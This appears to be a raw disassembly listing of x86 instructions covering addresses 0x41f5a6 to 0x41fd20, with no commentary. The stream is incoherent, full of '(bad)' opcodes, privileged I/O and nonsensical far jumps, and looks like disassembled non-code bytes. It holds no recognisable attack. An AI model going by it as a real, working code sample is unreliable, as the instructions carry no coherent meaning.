  41f5a6:	in     eax,0x9c
  41f5a8:	jmp    0x1387f594
  41f5ad:	pop    ebx
  41f5ae:	add    bl,BYTE PTR [esi]
  41f5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5b1:	clc    
  41f5b2:	sbb    al,0x69
  41f5b4:	es adc ah,dl
  41f5b7:	dec    ecx
  41f5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b9:	xchg   dh,dh
  41f5bb:	sub    DWORD PTR [ebx-0x2a],ebp
  41f5be:	push   edx
  41f5bf:	retf   
  41f5c0:	lds    eax,FWORD PTR [esi+0x77]
  41f5c3:	enter  0x1d5e,0x1a
  41f5c7:	mov    ds:0x868f03ff,eax
  41f5cc:	stos   BYTE PTR es:[edi],al
  41f5cd:	jb     0x41f5e3
  41f5cf:	sub    eax,0x3426c2bf
  41f5d4:	arpl   WORD PTR [ebx],di
  41f5d6:	test   al,0xf8
  41f5d8:	lahf   
  41f5d9:	in     al,dx
  41f5da:	mov    WORD PTR [eax],ss
  41f5dc:	push   esi
  41f5dd:	inc    esp
  41f5de:	jmp    0x94cd:0x60858c56
  41f5e5:	out    dx,eax
  41f5e6:	mov    ebp,eax
  41f5e8:	mov    bl,0x94
  41f5ea:	pop    esi
  41f5eb:	pop    esp
  41f5ec:	xchg   ebp,eax
  41f5ed:	mov    dl,ah
  41f5ef:	inc    edi
  41f5f0:	ins    DWORD PTR es:[edi],dx
  41f5f1:	ret    
  41f5f2:	idiv   BYTE PTR [edi]
  41f5f4:	mov    WORD PTR [ecx+ecx*4+0x7280a752],es
  41f5fb:	into   
  41f5fc:	int    0x0
  41f5fe:	pop    ss
  41f5ff:	imul   ebp,DWORD PTR [ecx],0xffffffc8
  41f602:	loope  0x41f649
  41f604:	xor    ebx,0x61
  41f607:	pop    es
  41f608:	adc    ch,al
  41f60a:	cmp    ebx,DWORD PTR [edx]
  41f60c:	add    eax,0x1135f2af
  41f611:	int3   
  41f612:	rol    ah,0x96
  41f615:	js     0x41f5d8
  41f617:	test   ecx,edi
  41f619:	in     eax,dx
  41f61a:	push   ss
  41f61b:	push   0x22a27245
  41f620:	jmp    0x41f699
  41f622:	mov    ebp,0x4b6c1769
  41f627:	mov    eax,0xfb63d9f7
  41f62c:	push   esi
  41f62d:	and    eax,0x8d026514
  41f632:	xchg   edi,eax
  41f633:	mov    ?,eax
  41f635:	in     al,0x3
  41f637:	mov    BYTE PTR [ebx-0x72f3a38d],bh
  41f63d:	cmp    DWORD PTR cs:[ebp-0x9],edi
  41f641:	sbb    DWORD PTR [esi-0x2bd3dd1e],edx
  41f647:	cmp    esi,ecx
  41f649:	in     al,0xd6
  41f64b:	and    ecx,ebp
  41f64d:	mov    al,0xf3
  41f64f:	dec    edi
  41f650:	mov    al,0x22
  41f652:	gs leave 
  41f654:	lds    eax,FWORD PTR [edx+edx*1+0x1d]
  41f658:	aam    0xcf
  41f65a:	rcl    DWORD PTR [edi],0x68
  41f65d:	rol    DWORD PTR [ebp+0x55],1
  41f660:	fcomp  QWORD PTR [ebp+0x2f5f75c]
  41f666:	clc    
  41f667:	retf   0x1e91
  41f66a:	cmp    ebx,DWORD PTR ds:[ecx]
  41f66d:	in     al,dx
  41f66e:	enter  0xf850,0xfe
  41f672:	or     edx,DWORD PTR [eax]
  41f674:	call   0x31b3:0x7132940b
  41f67b:	fsub   st(2),st
  41f67d:	push   ebx
  41f67e:	sbb    al,0xe7
  41f680:	push   edx
  41f681:	or     eax,0xc1603de4
  41f686:	shl    BYTE PTR [ecx],cl
  41f688:	addr16 sbb al,0xc3
  41f68b:	sahf   
  41f68c:	int3   
  41f68d:	int3   
  41f68e:	(bad)
  41f691:	inc    esi
  41f692:	add    DWORD PTR [ebx-0x4b],eax
  41f695:	sub    BYTE PTR [edx],ch
  41f697:	mov    ds:0x153bdd50,eax
  41f69c:	push   ss
  41f69d:	and    ah,dl
  41f69f:	inc    ebp
  41f6a0:	(bad)  
  41f6a1:	clc    
  41f6a2:	std    
  41f6a3:	jbe    0x41f685
  41f6a5:	(bad)  
  41f6a6:	jmp    0xb37fcc53
  41f6ab:	mov    ecx,0xc8cfc
  41f6b0:	das    
  41f6b1:	dec    ecx
  41f6b2:	aam    0xa0
  41f6b4:	bound  esp,QWORD PTR [edi-0x97e363b]
  41f6ba:	pop    ds
  41f6bb:	xchg   esi,eax
  41f6bc:	sbb    eax,0x33fc9098
  41f6c1:	cmc    
  41f6c2:	add    BYTE PTR [ebx],al
  41f6c4:	mov    bh,0x5b
  41f6c6:	leave  
  41f6c7:	int3   
  41f6c8:	(bad)  
  41f6c9:	sbb    ah,ah
  41f6cb:	add    BYTE PTR [ebp+0x1fa39ac3],cl
  41f6d1:	jb     0x41f6f6
  41f6d3:	adc    eax,0x803f8f8a
  41f6d8:	sahf   
  41f6d9:	popa   
  41f6da:	test   eax,0xdb539122
  41f6df:	out    dx,eax
  41f6e0:	xor    BYTE PTR [esi-0x50339a06],0x24
  41f6e7:	cdq    
  41f6e8:	outs   dx,BYTE PTR ds:[esi]
  41f6e9:	dec    edx
  41f6ea:	sbb    BYTE PTR [edx+ebp*1+0x1],al
  41f6ee:	retfw  0xaa6b
  41f6f2:	add    BYTE PTR [ebx],bh
  41f6f4:	shl    BYTE PTR [esi],1
  41f6f6:	ins    DWORD PTR es:[edi],dx
  41f6f7:	mov    ch,0x95
  41f6f9:	or     al,0xcc
  41f6fb:	xchg   eax,edx
  41f6fd:	xor    cl,BYTE PTR [edi]
  41f6ff:	mov    ch,0xfb
  41f701:	es inc ebp
  41f703:	push   edi
  41f704:	and    BYTE PTR [ebp-0x1b],bl
  41f707:	add    bh,BYTE PTR [esi-0x51]
  41f70a:	icebp  
  41f70b:	mov    ebp,0x18489008
  41f710:	dec    eax
  41f711:	mov    ebp,0xe4e2bfe8
  41f716:	ja     0x41f749
  41f718:	inc    ebp
  41f719:	xor    al,0x6c
  41f71b:	mov    ecx,0xfa256d32
  41f720:	ret    
  41f721:	pop    es
  41f722:	inc    ebp
  41f723:	cmc    
  41f724:	je     0x41f790
  41f726:	test   BYTE PTR [ebx],bl
  41f728:	sub    eax,0xf05dfa16
  41f72d:	mov    ah,0x1c
  41f72f:	pop    ds
  41f730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f731:	sub    ch,BYTE PTR [ebx+eax*1]
  41f734:	(bad)  
  41f735:	jne    0x41f7a1
  41f737:	shl    eax,cl
  41f739:	jno    0x41f76c
  41f73b:	mov    edi,0x77545de2
  41f740:	data16 ds lock (bad) 
  41f745:	adc    al,0xfb
  41f747:	in     eax,0x5e
  41f749:	and    eax,0x8be7dac3
  41f74e:	inc    esi
  41f74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f750:	mov    edi,0x1d44af8b
  41f755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f756:	cld    
  41f757:	and    DWORD PTR [ecx],ebx
  41f759:	jo     0x41f75a
  41f75b:	pop    esp
  41f75c:	push   ds
  41f75d:	xchg   DWORD PTR [ecx],edx
  41f75f:	sbb    dh,ah
  41f761:	add    eax,0x5c36364
  41f766:	loopne 0x41f7cf
  41f768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f769:	fmulp  st(4),st
  41f76b:	popa   
  41f76c:	in     eax,0x5b
  41f76e:	fisub  DWORD PTR [edi-0x51]
  41f771:	push   ecx
  41f772:	fisubr WORD PTR [ebx+ebp*4-0x598bda0e]
  41f779:	or     ebp,esp
  41f77b:	iret   
  41f77c:	add    cl,cl
  41f77e:	pusha  
  41f77f:	and    BYTE PTR [ebp-0x6],ch
  41f782:	pop    ebx
  41f783:	pusha  
  41f784:	sbb    BYTE PTR [esi+edi*1],ch
  41f787:	jmp    0xa1e7bd94
  41f78c:	push   0xffffff8a
  41f78e:	retf   0x7afd
  41f791:	iret   
  41f792:	xor    DWORD PTR [edi+0x14],edi
  41f795:	and    eax,0xbf8c7ba5
  41f79a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41f79c:	inc    esi
  41f79d:	xchg   ebp,eax
  41f79e:	push   ebx
  41f79f:	xchg   esp,eax
  41f7a0:	outs   dx,DWORD PTR ds:[esi]
  41f7a1:	sahf   
  41f7a2:	stos   BYTE PTR es:[edi],al
  41f7a3:	js     0x41f7bc
  41f7a5:	cli    
  41f7a6:	stc    
  41f7a7:	mov    ds:0xd080931a,al
  41f7ac:	xor    BYTE PTR [edi],bl
  41f7ae:	pusha  
  41f7af:	cmp    bh,bh
  41f7b1:	mov    al,ds:0x3e03e760
  41f7b6:	adc    BYTE PTR [ecx-0x7f],bl
  41f7b9:	sbb    al,0x5f
  41f7bb:	dec    esp
  41f7bc:	repnz int 0x8d
  41f7bf:	mov    al,ds:0xf9633864
  41f7c4:	jmp    0xeaf7:0xf1ce5b65
  41f7cb:	xor    ecx,eax
  41f7cd:	(bad)  
  41f7ce:	lods   al,BYTE PTR ds:[esi]
  41f7cf:	push   edi
  41f7d0:	test   eax,0x595d8d47
  41f7d5:	adc    bl,BYTE PTR [ebx+0x7f]
  41f7d8:	bound  ebp,QWORD PTR [edi+0x5bc8936d]
  41f7de:	aas    
  41f7df:	mov    esp,esi
  41f7e1:	ret    
  41f7e2:	push   esp
  41f7e3:	mov    eax,ds:0x4b9f801d
  41f7e8:	(bad)  [ebx]
  41f7ea:	aam    0x1
  41f7ec:	les    esp,FWORD PTR [edx+0x3bfdfd8]
  41f7f2:	cwde   
  41f7f3:	(bad)  
  41f7f4:	outs   dx,BYTE PTR ds:[esi]
  41f7f5:	jle    0x41f7d5
  41f7f7:	ror    ecx,cl
  41f7f9:	std    
  41f7fa:	das    
  41f7fb:	rol    DWORD PTR [esi+edi*1-0x36530296],0x81
  41f803:	jmp    0xe5d85941
  41f808:	mov    esp,0xf923e67b
  41f80d:	clc    
  41f80e:	fwait
  41f80f:	xchg   esp,eax
  41f810:	pop    ss
  41f811:	es jge 0x41f7ab
  41f814:	cli    
  41f815:	test   dl,ch
  41f817:	adc    dl,BYTE PTR [edi]
  41f819:	mov    cl,0x9a
  41f81b:	jbe    0x41f84b
  41f81d:	imul   edx,DWORD PTR [ebp+0x56022c83],0x48c6aa02
  41f827:	mov    bl,0x9
  41f829:	fst    QWORD PTR fs:[eax+0x68]
  41f82d:	jp     0x41f7e9
  41f82f:	inc    ecx
  41f830:	repnz mov dh,0xcd
  41f833:	mov    edi,0x6d8577ac
  41f838:	shl    BYTE PTR [ebp+0x247a9860],1
  41f83e:	hlt    
  41f83f:	mov    ebp,0x695e641f
  41f844:	fwait
  41f845:	call   0xe629ce10
  41f84a:	loope  0x41f8b0
  41f84c:	add    eax,0xba571cf0
  41f851:	sbb    dl,bl
  41f853:	sbb    dl,BYTE PTR [ebx-0x1e]
  41f856:	cmp    esp,edi
  41f858:	inc    ebp
  41f859:	cmp    eax,0xf3efde5
  41f85e:	nop    edi
  41f861:	aas    
  41f862:	mov    eax,ds:0x8920ed1a
  41f867:	pop    es
  41f868:	not    DWORD PTR [eax-0x35dbedb0]
  41f86e:	stc    
  41f86f:	cmp    ax,0xc911
  41f873:	mul    BYTE PTR [edx-0x26]
  41f876:	lods   eax,DWORD PTR ds:[esi]
  41f877:	pop    esi
  41f878:	mov    bl,BYTE PTR [ebx-0x68777be5]
  41f87e:	mov    ebx,0x17329106
  41f883:	ss daa 
  41f885:	imul   edi,DWORD PTR [ebx+esi*2],0x61
  41f889:	xor    edi,DWORD PTR [ebx+0x318cd994]
  41f88f:	push   0x4584789
  41f894:	push   edi
  41f895:	std    
  41f896:	fwait
  41f897:	mov    al,0xc9
  41f899:	imul   ebx,DWORD PTR [edi-0x4d80730],0x5cec2b2c
  41f8a3:	xor    edx,DWORD PTR [eax-0x6b]
  41f8a6:	jg     0x41f900
  41f8a8:	dec    edi
  41f8a9:	clc    
  41f8aa:	lds    edx,FWORD PTR [esi]
  41f8ac:	out    0x83,al
  41f8ae:	add    al,0x8d
  41f8b0:	fisttp DWORD PTR [eax+0x5828728c]
  41f8b6:	ins    BYTE PTR es:[edi],dx
  41f8b7:	bnd jbe 0x41f877
  41f8ba:	retf   
  41f8bb:	mov    eax,0x71428d3d
  41f8c0:	mov    edx,0x64f6d8f5
  41f8c5:	sub    al,0xac
  41f8c7:	rcl    BYTE PTR [edx],cl
  41f8c9:	dec    esi
  41f8ca:	push   esi
  41f8cb:	ret    0x7243
  41f8ce:	jp     0x41f941
  41f8d0:	sahf   
  41f8d1:	fidivr DWORD PTR [ebx+ebp*1+0xcf4c566]
  41f8d8:	stos   DWORD PTR es:[edi],eax
  41f8d9:	cmp    eax,0x98ff497d
  41f8de:	shl    BYTE PTR [ebx],0x26
  41f8e1:	xchg   DWORD PTR [esi+0x35],ebx
  41f8e4:	retf   
  41f8e5:	xor    esp,ecx
  41f8e7:	pop    ebx
  41f8e8:	adc    ebx,DWORD PTR es:[edi]
  41f8eb:	xchg   edi,eax
  41f8ec:	mov    ds:0x8273f174,al
  41f8f1:	sbb    eax,0xf2cb573c
  41f8f6:	gs das 
  41f8f8:	sbb    ecx,esi
  41f8fa:	add    ebx,DWORD PTR [ebp+ecx*2-0xb]
  41f8fe:	out    dx,eax
  41f8ff:	retf   0xb6c4
  41f902:	jg     0x41f885
  41f904:	sbb    al,BYTE PTR [ebp+0x47e41f2c]
  41f90a:	jp     0x41f929
  41f90c:	jns    0x41f986
  41f90e:	leave  
  41f90f:	mov    dh,0x37
  41f911:	out    dx,al
  41f912:	mov    bh,0xcc
  41f914:	mov    al,ds:0xf252ae78
  41f919:	popf   
  41f91a:	sbb    BYTE PTR [ebx+ecx*8],bh
  41f91d:	nop
  41f91e:	call   0x105561d
  41f923:	add    bh,BYTE PTR [edi+0x53]
  41f926:	cmp    DWORD PTR [ebx+0xb5ce686],ebx
  41f92c:	imul   DWORD PTR [eax-0xa22a42]
  41f932:	sbb    DWORD PTR [ebp-0x74],ecx
  41f935:	push   edx
  41f936:	jo     0x41f8c0
  41f938:	and    dh,BYTE PTR [eax]
  41f93a:	xor    bh,BYTE PTR [esi-0xbc32a8b]
  41f940:	sub    DWORD PTR [edx-0x73],0x23bcba2e
  41f947:	push   ebp
  41f948:	aas    
  41f949:	outs   dx,DWORD PTR ds:[esi]
  41f94a:	pop    ebp
  41f94b:	xor    BYTE PTR [ecx],dh
  41f94d:	and    al,0x5c
  41f94f:	pop    esi
  41f950:	jecxz  0x41f996
  41f952:	int3   
  41f953:	xchg   edx,edi
  41f955:	jno    0x41f900
  41f957:	jae    0x41f9b6
  41f959:	mov    al,ds:0x18bf2faf
  41f95e:	or     al,0x3
  41f960:	add    eax,0xf69f41f6
  41f965:	jg     0x41f9c6
  41f967:	maskmovq mm2,(bad)
  41f968:	not    DWORD PTR [esi-0x6e2598f5]
  41f96e:	add    al,BYTE PTR [esi-0xa]
  41f971:	dec    eax
  41f972:	out    0x82,eax
  41f974:	in     eax,dx
  41f975:	in     al,0x9c
  41f977:	sti    
  41f978:	scas   eax,DWORD PTR es:[edi]
  41f979:	call   0x934:0x1c16b844
  41f980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f981:	or     DWORD PTR [edi-0xa9cc8f5],eax
  41f987:	pop    ds
  41f988:	leave  
  41f989:	ja     0x41f974
  41f98b:	retf   0x6822
  41f98e:	shl    DWORD PTR [ebp+0x5734ed25],1
  41f994:	test   eax,0xb4a973c0
  41f999:	cs cs pop edx
  41f99c:	adc    al,0x66
  41f99e:	or     al,0x8
  41f9a0:	adc    eax,0xd954bf37
  41f9a5:	stos   BYTE PTR es:[edi],al
  41f9a6:	jne    0x41f9a0
  41f9a8:	iret   
  41f9a9:	fwait
  41f9aa:	leave  
  41f9ab:	imul   ebp,DWORD PTR [ebx],0xe
  41f9ae:	or     esp,DWORD PTR [ebp+0x3325fb11]
  41f9b4:	mov    DWORD PTR [ecx-0x62328a2],esp
  41f9ba:	call   0xf7ccb126
  41f9bf:	push   es
  41f9c0:	xor    dl,0xfe
  41f9c3:	bnd jge 0x41f9bb
  41f9c6:	sub    BYTE PTR [ebx-0x4],al
  41f9c9:	lea    esi,[ebp-0x3c]
  41f9cc:	neg    BYTE PTR [esi-0xa1f1b7c]
  41f9d2:	enter  0x8e9e,0x67
  41f9d6:	(bad)  
  41f9d7:	into   
  41f9d8:	dec    eax
  41f9d9:	mov    bl,0x2d
  41f9db:	jo     0x41fa1a
  41f9dd:	dec    edi
  41f9de:	rcl    BYTE PTR [ebx+0x24],cl
  41f9e1:	jno    0x41f999
  41f9e3:	mov    al,0x86
  41f9e5:	dec    ebp
  41f9e6:	jns    0x41fa40
  41f9e8:	adc    ebx,ecx
  41f9ea:	mov    cl,0xb9
  41f9ec:	mov    DWORD PTR [esi+eax*8],ecx
  41f9ef:	sbb    DWORD PTR [ecx-0x4f265db7],ecx
  41f9f5:	into   
  41f9f6:	jle    0x41fa47
  41f9f8:	and    eax,0xd614c7ed
  41f9fd:	and    BYTE PTR [eax-0x2da00305],al
  41fa03:	xchg   ebx,eax
  41fa04:	sub    al,0x28
  41fa06:	rol    DWORD PTR [eax-0x217ed21e],0x3a
  41fa0d:	repz imul edi,edx,0x5
  41fa11:	mov    ecx,0x1e11cb21
  41fa16:	repz jnp 0x41f9ba
  41fa19:	icebp  
  41fa1a:	stos   BYTE PTR es:[edi],al
  41fa1b:	jbe    0x41fa8e
  41fa1d:	or     al,0xa6
  41fa1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa20:	pop    esi
  41fa21:	jp     0x41f9ab
  41fa23:	or     al,0xe5
  41fa25:	push   esi
  41fa26:	and    eax,0x43a4a825
  41fa2b:	mov    bl,BYTE PTR [eax+0xdf9d530]
  41fa31:	call   0xc4b6ab14
  41fa36:	jmp    0xac3d1ed8
  41fa3b:	ror    ah,1
  41fa3d:	rol    DWORD PTR [ebp+0x7e137740],0xaa
  41fa44:	(bad)  
  41fa45:	jg     0x41fa13
  41fa47:	mov    cl,0x77
  41fa49:	jecxz  0x41fac0
  41fa4b:	mov    ds:0xb0dbfe22,al
  41fa50:	dec    ebp
  41fa51:	imul   edi,DWORD PTR [ebp-0x19],0x44
  41fa55:	push   esi
  41fa56:	dec    esp
  41fa57:	or     DWORD PTR [eax+ebp*2-0x2f],esi
  41fa5b:	push   0x47
  41fa5d:	pop    ebp
  41fa5e:	pop    esi
  41fa5f:	mov    WORD PTR cs:0xb2ae84ea,fs
  41fa66:	call   0x19ffd0c
  41fa6b:	pop    ebx
  41fa6c:	ret    0x89d8
  41fa6f:	dec    BYTE PTR [eax-0x3]
  41fa72:	pop    ebp
  41fa73:	pop    ss
  41fa74:	hlt    
  41fa75:	in     eax,0xf1
  41fa77:	mov    ds:0x9a4d9669,eax
  41fa7c:	xchg   ebp,eax
  41fa7d:	sub    edi,esp
  41fa7f:	shl    bl,cl
  41fa81:	dec    edi
  41fa82:	pop    eax
  41fa83:	jmp    0x41faad
  41fa85:	sub    edx,esi
  41fa87:	dec    eax
  41fa88:	xchg   esp,eax
  41fa89:	fincstp 
  41fa8b:	ins    BYTE PTR es:[edi],dx
  41fa8c:	mov    dh,0x2a
  41fa8e:	sbb    ecx,DWORD PTR [eax]
  41fa90:	fadd   QWORD PTR [edx]
  41fa92:	int3   
  41fa93:	xchg   DWORD PTR [ebp-0x36b40ce7],ebp
  41fa99:	popa   
  41fa9a:	gs hlt 
  41fa9c:	dec    ebp
  41fa9d:	xchg   ecx,eax
  41fa9e:	lods   al,BYTE PTR ds:[esi]
  41fa9f:	jmp    0x41fb1e
  41faa1:	retf   
  41faa2:	inc    eax
  41faa3:	fisttp QWORD PTR [ebp+0x557a60b1]
  41faa9:	fimul  DWORD PTR [ecx]
  41faab:	rcl    DWORD PTR [edx+0x79e4372c],cl
  41fab1:	mov    dh,0xae
  41fab3:	sha256msg1 xmm0,XMMWORD PTR [edi-0x12]
  41fab8:	out    0x23,al
  41faba:	js     0x41fa87
  41fabc:	ins    DWORD PTR es:[edi],dx
  41fabd:	cdq    
  41fabe:	sub    edi,DWORD PTR [ebx+0x66]
  41fac1:	fs sbb eax,esp
  41fac4:	mov    al,0x28
  41fac6:	les    ebx,FWORD PTR [edi]
  41fac8:	ds dec esi
  41faca:	das    
  41facb:	aad    0xab
  41facd:	test   esi,esp
  41facf:	aam    0x16
  41fad1:	adc    BYTE PTR [ecx+0xe],ch
  41fad4:	fadd   st(4),st
  41fad6:	(bad)  
  41fad7:	dec    edi
  41fad9:	push   esp
  41fada:	std    
  41fadb:	inc    esp
  41fadc:	ins    DWORD PTR es:[edi],dx
  41fadd:	adc    BYTE PTR ds:0x90a98bf2,al
  41fae3:	jb     0x41fa97
  41fae5:	(bad)  
  41fae6:	imul   ebp,edx,0x62b58b0a
  41faec:	jnp    0x41fb52
  41faee:	js     0x41fb3b
  41faf0:	sbb    al,0x43
  41faf2:	and    eax,0x9c1585da
  41faf7:	xchg   edx,eax
  41faf8:	ds lahf 
  41fafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fafb:	cmp    ebx,DWORD PTR [ebx]
  41fafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fafe:	cli    
  41faff:	push   eax
  41fb00:	adc    al,0xc1
  41fb02:	out    dx,al
  41fb03:	stos   BYTE PTR es:[edi],al
  41fb04:	mov    esp,DWORD PTR [esi]
  41fb06:	mov    ebx,0xceee42fb
  41fb0b:	xlat   BYTE PTR ds:[ebx]
  41fb0c:	clc    
  41fb0d:	xchg   esp,eax
  41fb0e:	mul    DWORD PTR [edi]
  41fb10:	into   
  41fb11:	inc    esp
  41fb12:	shr    DWORD PTR [ebp-0x4c],0xae
  41fb16:	cld    
  41fb17:	fsubr  DWORD PTR [edi+0x3a7a8e59]
  41fb1d:	jl     0x41fab5
  41fb1f:	dec    eax
  41fb20:	inc    esp
  41fb21:	sub    al,BYTE PTR [edi-0x51]
  41fb24:	sub    BYTE PTR [edi],0x3f
  41fb27:	pop    edi
  41fb28:	add    al,0xb5
  41fb2a:	iret   
  41fb2b:	mov    dh,0x49
  41fb2d:	test   DWORD PTR ds:0x1753a868,esp
  41fb33:	mov    ecx,DWORD PTR [ecx-0x17550edd]
  41fb39:	xor    dl,BYTE PTR [esi+0x61afd322]
  41fb3f:	aas    
  41fb40:	adc    al,0xc0
  41fb42:	mov    ds:0x24f09560,al
  41fb47:	sbb    edi,0xffffffb3
  41fb4a:	xchg   esp,eax
  41fb4b:	test   eax,0xfef3c103
  41fb50:	int    0xb1
  41fb52:	cs jle 0x41fb5a
  41fb55:	je     0x41fb6e
  41fb57:	mov    ebp,DWORD PTR [edx+0x73]
  41fb5a:	repnz stos DWORD PTR es:[edi],eax
  41fb5c:	fisttp WORD PTR [edi+edx*4]
  41fb5f:	imul   eax,esi,0xffffff8d
  41fb62:	sub    eax,DWORD PTR [eax+edx*4-0x48c0e3eb]
  41fb69:	js     0x41fb2e
  41fb6b:	retf   0x5b0
  41fb6e:	adc    eax,0x27e861eb
  41fb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb74:	push   esp
  41fb75:	ds in  al,dx
  41fb77:	stos   BYTE PTR es:[edi],al
  41fb78:	sub    esp,0x19
  41fb7b:	(bad)  
  41fb7c:	call   0x3a5063c9
  41fb81:	loop   0x41fbd9
  41fb83:	enter  0x65f2,0x72
  41fb87:	pop    esi
  41fb88:	cmp    bh,cl
  41fb8a:	lock jmp 0x41fb6e
  41fb8d:	xchg   DWORD PTR [edx],eax
  41fb8f:	das    
  41fb90:	cwde   
  41fb91:	fistp  WORD PTR [esi+0x3a]
  41fb94:	xor    DWORD PTR [ecx+0x27],edx
  41fb97:	out    0x7c,al
  41fb99:	nop
  41fb9a:	push   ecx
  41fb9b:	mov    fs,esp
  41fb9d:	es xor al,0xbb
  41fba0:	mov    dh,0x42
  41fba2:	xchg   esp,eax
  41fba3:	adc    dh,BYTE PTR [ebx-0x512221c4]
  41fba9:	dec    edx
  41fbaa:	dec    esp
  41fbab:	jo     0x41fb8d
  41fbad:	ret    
  41fbae:	ds jmp 0x7179:0x4e71e662
  41fbb6:	dec    ecx
  41fbb7:	adc    al,0x48
  41fbb9:	sbb    eax,0x3245ed96
  41fbbe:	dec    esi
  41fbbf:	jp     0x41fb56
  41fbc1:	mov    bh,0xe4
  41fbc3:	jmp    0xdd03:0xc8e01175
  41fbca:	test   al,0xf4
  41fbcc:	ror    DWORD PTR [eax-0x2b03693b],0x32
  41fbd3:	push   esi
  41fbd4:	shr    edx,1
  41fbd6:	int    0x47
  41fbd8:	cs test al,0xae
  41fbdb:	stc    
  41fbdc:	xor    BYTE PTR [ecx],0xe7
  41fbdf:	push   0xd3cccf3e
  41fbe4:	es in  al,0x20
  41fbe7:	sti    
  41fbe8:	cmp    esi,edi
  41fbea:	aad    0x23
  41fbec:	and    BYTE PTR [edi-0x6307135e],dl
  41fbf2:	inc    esi
  41fbf3:	inc    edx
  41fbf4:	inc    edi
  41fbf5:	cmp    eax,0x8d743c87
  41fbfa:	push   esp
  41fbfb:	pop    ds
  41fbfc:	jb     0x41fc4f
  41fbfe:	push   ss
  41fbff:	push   ebp
  41fc00:	data16 sti 
  41fc02:	and    bh,BYTE PTR [ecx+eax*1]
  41fc05:	(bad)  
  41fc07:	pop    edx
  41fc08:	sub    al,0x4b
  41fc0a:	mov    dh,0xb3
  41fc0c:	call   0xda63:0x227
  41fc12:	pop    ecx
  41fc13:	retf   
  41fc14:	cmp    DWORD PTR [ebx+ebp*4],esi
  41fc17:	into   
  41fc18:	repnz ins DWORD PTR es:[edi],dx
  41fc1a:	retf   
  41fc1b:	xor    DWORD PTR [ebx],ecx
  41fc1d:	test   eax,eax
  41fc1f:	stc    
  41fc20:	das    
  41fc21:	div    bh
  41fc23:	fnstcw WORD PTR [edx]
  41fc25:	ror    DWORD PTR [esi-0x2687258d],0xd9
  41fc2c:	ss fs aas 
  41fc2f:	push   0xfffffff4
  41fc31:	stos   BYTE PTR es:[edi],al
  41fc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc33:	pop    edi
  41fc34:	cdq    
  41fc35:	call   0x228e:0x3d16ea76
  41fc3c:	mov    bh,0xda
  41fc3e:	rcl    DWORD PTR [edx+0x44748d3f],1
  41fc44:	shl    eax,cl
  41fc46:	dec    edi
  41fc47:	test   DWORD PTR [ebp-0x60],0x2b8669fc
  41fc4e:	mov    ds:0xfb248da0,eax
  41fc53:	pop    ebx
  41fc54:	ins    BYTE PTR es:[edi],dx
  41fc55:	add    eax,0x86c26391
  41fc5a:	jg     0x41fcd5
  41fc5c:	mov    al,ds:0x63db7985
  41fc61:	push   0x9
  41fc63:	mov    BYTE PTR [edi-0x72],bl
  41fc66:	push   ds
  41fc67:	ret    
  41fc68:	retf   0xe6fa
  41fc6b:	data16 (bad) 
  41fc6d:	push   ss
  41fc6e:	and    DWORD PTR ds:0xe0ad76fe,ebp
  41fc74:	sti    
  41fc75:	push   ds
  41fc76:	inc    eax
  41fc77:	adc    eax,0x183c2f98
  41fc7c:	add    eax,0x6c301fb7
  41fc81:	or     al,0xf4
  41fc83:	jge    0x41fc4b
  41fc85:	loop   0x41fccf
  41fc87:	inc    eax
  41fc88:	icebp  
  41fc89:	jo     0x41fcf7
  41fc8b:	out    0xbd,al
  41fc8d:	jl     0x41fcaa
  41fc8f:	jo     0x41fc7e
  41fc91:	xor    BYTE PTR [ecx+ebp*1+0x15b4f66d],bl
  41fc98:	fdivr  st(2),st
  41fc9a:	adc    cl,BYTE PTR [edx+ebp*2+0x41cb35a6]
  41fca1:	lea    edi,[ecx-0x506455fe]
  41fca7:	fwait
  41fca8:	adc    edi,eax
  41fcaa:	mov    ds:0x540eabd9,eax
  41fcaf:	jle    0x41fca9
  41fcb1:	les    ebx,FWORD PTR [edx]
  41fcb3:	in     al,0xc3
  41fcb5:	cmp    BYTE PTR [eiz*8-0x2a41cb78],ch
  41fcbc:	xchg   esp,eax
  41fcbd:	stc    
  41fcbe:	fdiv   DWORD PTR [bx+si+0x1a14]
  41fcc3:	jl     0x41fcad
  41fcc5:	jl     0x41fc70
  41fcc7:	push   ds
  41fcc8:	ds aaa 
  41fcca:	dec    esp
  41fccb:	popf   
  41fccc:	repz pop ecx
  41fcce:	fcmovnu st,st(3)
  41fcd0:	mov    esi,0xebc80c78
  41fcd5:	mov    ebp,ebp
  41fcd7:	push   es
  41fcd8:	addr16 int3 
  41fcda:	inc    ebx
  41fcdb:	icebp  
  41fcdc:	(bad)  
  41fcdd:	popa   
  41fcde:	in     eax,dx
  41fcdf:	mov    cl,0x84
  41fce1:	cld    
  41fce2:	pushf  
  41fce3:	fistp  WORD PTR ds:0x43f160db
  41fce9:	jge    0x41fd62
  41fceb:	pop    ds
  41fcec:	adc    bh,BYTE PTR [ecx+eax*2+0x4580af79]
  41fcf3:	aam    0x7e
  41fcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcf6:	jmp    0x297d:0xf26994ef
  41fcfd:	(bad)  
  41fcfe:	out    dx,eax
  41fcff:	mov    edi,0xc34fbe4a
  41fd04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd05:	mov    bh,0x9f
  41fd07:	outs   dx,BYTE PTR ds:[esi]
  41fd08:	pop    edx
  41fd09:	div    DWORD PTR [eax]
  41fd0b:	push   ebx
  41fd0c:	mov    edi,0xda38ac65
  41fd11:	jb     0x41fd8e
  41fd13:	shl    DWORD PTR [ebp+0x34c9837f],cl
  41fd19:	pusha  
  41fd1a:	popa   
  41fd1b:	retf   0x142b
  41fd1e:	fs retf 
  41fd20:	jae    0x41fcc8
